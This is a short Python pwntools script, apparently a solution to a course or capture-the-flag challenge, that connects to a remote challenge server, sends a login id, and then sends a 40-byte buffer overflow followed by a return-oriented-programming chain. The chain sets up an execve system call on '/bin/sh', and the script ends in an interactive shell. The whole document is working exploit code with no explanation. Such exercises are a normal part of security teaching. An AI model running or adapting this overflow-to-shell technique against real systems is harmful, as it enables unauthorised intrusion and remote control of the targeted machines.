from pwn import *
import sys

REMOTE = True
bridge = ELF(sys.argv[1])
if REMOTE:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1342)
    print(p.recvuntil(":"))
    p.sendline("joe215")
else:
    p = process(sys.argv[1])

a = p64(0x400625)
b = p64(0x40062e)
c = p64(0x400636)
d = p64(0x40063e)
e = p64(0x400646)
binsh = p64(0x400708)
syscall = p64(59)
zero = p64(0)
print(p.recvuntil("!"))

overflow = "A" * 40
rop = b + binsh + c + zero + d + zero + e + syscall + a

full = overflow + rop
p.sendline(full)
p.interactive()
